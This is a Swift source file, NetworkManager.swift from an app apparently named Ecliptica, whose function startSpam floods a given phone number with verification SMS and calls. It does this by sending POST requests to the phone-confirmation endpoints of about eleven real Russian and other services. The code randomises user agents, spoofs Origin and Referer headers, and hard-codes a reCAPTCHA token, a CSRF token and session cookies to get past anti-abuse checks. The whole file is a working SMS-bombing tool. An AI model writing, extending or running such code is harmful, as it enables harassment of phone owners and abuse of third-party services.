//
//  NetworkManager.swift
//  Ecliptica
//
//  Created by Someone on 08.10.2023.
//

import Foundation

struct RaiffeisenSite {
    static let baseURL = "https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms"
    static let shouldSetHeaders = true
}

struct SecondSite {
    static let baseURL = "https://api-prime.anytime.global/api/v2/auth/sendVerificationCode"
}

struct AkbarsaSite {
    static let baseURL = "https://www.akbars.ru/api/PhoneConfirm/"
}

struct YotaSite {
    static let baseURL = "https://cloudbeeline.ru/api/2/accounts/beeline_request_code/"
}

struct ReklamaSite {
    static let baseURL = "https://reklama.tochka.com/app/api/authorization/login"
}

struct BetSite {
    static let baseURL = "https://site-api.vkusnoitochka.ru/api/v1/user/login/phone"
}

struct DomSite {
    static let baseURL = "https://www.domovenok.ru/proxy_request/Auth.GetCode"
}

struct KitchenSite {
    static let baseURL = "https://4lapy.ru/ajax/confirmation/phone/send-code"
}

struct RigSite {
    static let baseURL = "https://app.medtochka.ru/api/profile/confirmation/web/request/"
    static let AGA = true
}

struct Rig1Site {
    static let baseURL = "https://unacademy.com/api/v3/user/user_check/"
}

struct SokSite {
    static let baseURL = "https://lk.ofd.ru/api/Authorization/SendConfirmationCode"
}


class NetworkManager {
    static let shared = NetworkManager()
    
    private init() {}
    
    func getRandomUserAgent() -> String {
        let randomIndex = Int.random(in: 0..<userAgents.count)
        return userAgents[randomIndex]
    }
    
    func startSpam(phone: String, numberOfThreads: String, service: String, completion: @escaping (Error) -> Void) {
        var urlString = ""
        var shouldSetHeaders = false
        var AGA = false
        var userAgent = getRandomUserAgent()
        
        switch service {
        case "RaiffeisenSite":
            urlString = RaiffeisenSite.baseURL
            shouldSetHeaders = RaiffeisenSite.shouldSetHeaders
        case "secondSite":
            urlString = SecondSite.baseURL
        case "akbarsa":
            urlString = AkbarsaSite.baseURL
        case "yota":
            urlString = YotaSite.baseURL
        case "rek":
            urlString = ReklamaSite.baseURL
        case "bet":
            urlString = BetSite.baseURL
        case "dom":
            urlString = DomSite.baseURL
        case "kit":
            urlString = KitchenSite.baseURL
        case "rig":
            urlString = RigSite.baseURL
            AGA = RigSite.AGA
        case "rig1":
            urlString = Rig1Site.baseURL
        case "sok":
            urlString = SokSite.baseURL
        default:
            break
        }
        
        let url = URL(string: urlString)!
        var request = URLRequest(url: url)
        
        request.httpMethod = "POST"
        request.setValue(userAgent, forHTTPHeaderField: "User-Agent")
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        
        if shouldSetHeaders {
            request.setValue("application/json, text/javascript, */*; q=0.01", forHTTPHeaderField: "Accept")
            request.setValue("ru,en;q=0.9,cy;q=0.8,uz;q=0.7", forHTTPHeaderField: "Accept-Language")
            request.setValue("keep-alive", forHTTPHeaderField: "Connection")
            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
            request.setValue("https://www.raiffeisen.ru", forHTTPHeaderField: "Origin")
            request.setValue("https://www.raiffeisen.ru/retail/cards/debit/cashback-card/", forHTTPHeaderField: "Referer")
            request.setValue("empty", forHTTPHeaderField: "Sec-Fetch-Dest")
            request.setValue("cors", forHTTPHeaderField: "Sec-Fetch-Mode")
            request.setValue("same-site", forHTTPHeaderField: "Sec-Fetch-Site")
            request.setValue(userAgent, forHTTPHeaderField: "sec-ch-ua")
            request.setValue("?0", forHTTPHeaderField: "sec-ch-ua-mobile")
            request.setValue("\"Windows\"", forHTTPHeaderField: "sec-ch-ua-platform")
        }
        
        if AGA {
            request.setValue("application/json, text/plain, */*", forHTTPHeaderField: "Accept")
            request.setValue("keep-alive", forHTTPHeaderField: "Connection")
            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
            request.setValue("csrftoken=PC38ISYsApOpUofyp5xyRCVgeZsdfS2kggsh4wbx0mmjxVfNopzVS3vGL1eq3KFo; expires=Tue, 15 Oct 2024 16:05:02 GMT; Max-Age=31449600; Path=/; SameSite=Lax; Secure", forHTTPHeaderField: "Set-Cookie")
            request.setValue("https://app.medtochka.ru", forHTTPHeaderField: "Origin")
            request.setValue("https://app.medtochka.ru/authorization/", forHTTPHeaderField: "Referer")
            request.setValue("PC38ISYsApOpUofyp5xyRCVgeZsdfS2kggsh4wbx0mmjxVfNopzVS3vGL1eq3KFo", forHTTPHeaderField: "X-Csrftoken")
            request.setValue(userAgent, forHTTPHeaderField: "User-Agent")
            request.setValue("_ym_uid=1697553225462481409; _ym_d=1697553225; _ga=GA1.1.1739206784.1697553226; _ym_isad=2; csrftoken=PC38ISYsApOpUofyp5xyRCVgeZsdfS2kggsh4wbx0mmjxVfNopzVS3vGL1eq3KFo; _ym_visorc=w; _ga_PYGEM3FXRQ=GS1.1.1697558431.3.1.1697558687.0.0.0", forHTTPHeaderField: "Cookie")
        }
        
        var parameters: [String: Any] = [:]
        
        switch service {
        case "RaiffeisenSite":
            var second10Phone = phone
            if !second10Phone.isEmpty {
                second10Phone = "7" + second10Phone
            }
            parameters = [
                "captchaToken" : "noactualtoken",
                "number" : second10Phone
            ]
        case "secondSite":
            var second19Phone = phone
            if !second19Phone.isEmpty {
                second19Phone = "+7" + second19Phone
            }
            parameters = [
                "login" : second19Phone,
                "returnUrl" : "/connect/authorize/callback?client_id=f1dac608-dd35-4717-8cbb-18e2f7a1d522&redirect_uri=https%3A%2F%2Flk.mosmetro.ru%2Fexternal-auth&response_type=code&scope=openid%20offline_access%20nbs.ppa%20idps&code_challenge=ON80NctdWFNtmPw7rfuiCdW_h8M6WY8UxrBLlLaoDgQ&code_challenge_method=S256&nonce=638328770452865903.ZmI4NjBiZjktMjQ4Zi00YTE0LTg1MTEtNmE5YTFmYTc1ZmZiZGI1NmMwNTAtYjEwOC00MGNkLWE1MjEtOGI4MTRkYzk5NDM0&state=oe6daed4xdl7btmh54k973&ui_locales=ru&acr_values=theme%3Alight"
            ]
        case "akbarsa":
            parameters = [
                "phoneNumber" : phone
            ]
        case "yota":
            var second18Phone = phone
            if !second18Phone.isEmpty {
                second18Phone = "+7" + second18Phone
            }
            parameters = [
                "phone" : second18Phone
            ]
        case "rek":
            var second1Phone = phone
            if !second1Phone.isEmpty {
                second1Phone = "7" + second1Phone
            }
            parameters = [
                "aori_mode" : "",
                "login_phone" : second1Phone,
                "user_glcid" : "UA-58531514-11:1341294100.1696926698;",
                "user_yclid" : "yaCounter84146887:1696926700343439929;"
            ]
        case "bet":
            var second100Phone = phone
            if !second100Phone.isEmpty {
                second100Phone = "+7" + second100Phone
            }
            parameters = [
                "g-recaptcha-response" : "03AFY_a8W9USknoUmUbtX0KW3Ng5BKGl9ldVaNJUpxS9UR1QfiutmkZFHhQVkakRVr0wGVM7R3tPmRILtKXtQStsUDQH79JbmdLqI-APyTSvAxaJWZVzhPbOU-q2WwHBmnacHeWqXBJgGv0JCPWkT1mi9lnLAtCSQ1NKrSBY1qxEIakK44l32v7iQvolZIqAfpL8xaIBV_9b5T95DFH1XZUnQpG16OJlNql3TI5BT3Y8fHQ8nnc006pcRiB1cmWja17FfvDoGO-zQbdBDGsoGP3xcvcvgi-r8LrC3pdCmk156qSEzMvaSi9VI0j1EclElYXNmYRhNz-YcfD4EhvaQBfSSonwniL0WeFF3M8JUYu5TRSSlM8S5ydzFraYKp4oujrAaUTwVIujofyZaW5DJxXz_WhXVgSB6t_qweTf0YW5w9DB-7jl4HJQA1Pln26enY8xBywtwNlbPO2-WKMPMgNNGIe83jcYNdhxyIt37IyFJPo8UtZHmVyJv5mDMupyyhl7QYqCbdanH1QTDuO8_lBcrhvnTmga5gKQ",
                "number" : second100Phone
            ]
        case "dom":
            var second12Phone = phone
            if !second12Phone.isEmpty {
                second12Phone = "+7" + second12Phone
            }
            parameters = [
                "FlashCall": true,
                "Phone": second12Phone
            ]
        case "kit":
            var second12Phone = phone
            if !second12Phone.isEmpty {
                second12Phone = "+7" + second12Phone
            }
            parameters = [
                "form_type" : "form_registration_on_site",
                "phone": second12Phone,
                "forPhoneConfirmation": true,
                "smart-token" : ""
            ]
        case "rig":
            var second12200Phone = phone
            if !second12200Phone.isEmpty {
                second12200Phone = "7" + second12200Phone
            }
            parameters = [
                "phone": second12200Phone
            ]
        case "rig1":
            var second122009Phone = phone
            if !second122009Phone.isEmpty {
                second122009Phone = "+7" + second122009Phone
            }
            parameters = [
                "phone": second122009Phone,
                "country_code": "KZ"
            ]
        case "sok":
            var second1200Phone = phone
            if !second1200Phone.isEmpty {
                second1200Phone = "7" + second1200Phone
            }
            parameters = [
                "OperationType" : "Registration",
                "Recipient": second1200Phone
            ]
        default:
            break
        }
        
        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: parameters)
        } catch {
            completion(error)
            return
        }
        
        let task = URLSession.shared.dataTask(with: request) { (data, response, error) in
            
        }
        
        task.resume()
    }
}
